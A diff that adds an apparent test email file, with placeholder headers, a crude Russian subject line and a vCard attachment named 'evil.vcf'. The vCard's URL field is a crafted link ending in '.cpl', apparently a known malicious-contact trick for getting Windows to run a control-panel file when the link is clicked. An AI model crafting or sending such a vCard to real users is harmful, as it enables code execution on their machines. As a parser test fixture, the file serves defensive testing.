@@ -1,0 +1,57 @@
+From: =?utf-8?B?0JzQsNC60YEg0JLQvtC50YbQuNC6?= <sample@gmail.com>
+To: 123 <123@sampledomaincin.com>
+Subject: =?utf-8?B?0YXRg9C5?=
+Date: Thu, 21 Feb 2019 10:17:38 +0500
+Message-ID: <CAM3MBUQMnz7a9zPrNOA027Mi5ckZHa_WsGcUdBey+g4XnwDM9Q@mail.gmail.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0000_01D4CDD3.A22D0540"
+X-Mailer: Microsoft Outlook 16.0
+Thread-Index: AQK2zXdFnKrMU69Vyb4bJe32gtZ2WQ==
+Content-Language: ru
+x-ms-exchange-organization-authsource: sample.sample.ru
+x-ms-exchange-organization-authas: Anonymous
+received-spf: Pass (sample.sample.ru: domain of sample@gmail.com designates 209.85.167.172 as permitted sender) receiver=sample.sample.ru; client-ip=209.85.167.172; helo=mail-oi1-f172.google.com;
+
+This is a multipart message in MIME format.
+
+------=_NextPart_000_0000_01D4CDD3.A22D0540
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_001_0001_01D4CDD3.A22D0540"
+
+
+------=_NextPart_001_0001_01D4CDD3.A22D0540
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: 8bit
+
+фывфыв
+
+
+------=_NextPart_001_0001_01D4CDD3.A22D0540
+Content-Type: text/html;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+<div dir=3D"ltr">=D1=84=D1=8B=D0=B2=D1=84=D1=8B=D0=B2<br></div>
+
+------=_NextPart_001_0001_01D4CDD3.A22D0540--
+
+------=_NextPart_000_0000_01D4CDD3.A22D0540
+Content-Type: text/x-vcard;
+	name="evil.vcf"
+Content-Transfer-Encoding: 7bit
+Content-ID: <f_jse6dfon0>
+Content-Disposition: attachment;
+	filename="evil.vcf"
+
+BEGIN:VCARD
+VERSION:4.0
+N:Tricky;DealC0der;;;
+FN:TrickyDealC0der
+EMAIL;TYPE=home;PREF=1:M$@PwnedAgain.com
+TEL;TYPE="cell,home";PREF=1:tel:+000-000-0000
+ADR;TYPE=home;PREF=1:;;1 NYC;NY;;WC2N;USA
+URL;TYPE=home;PREF=1:http.\\www.hyp3rlinx.altervista.cpl
+END:VCARD
+------=_NextPart_000_0000_01D4CDD3.A22D0540--
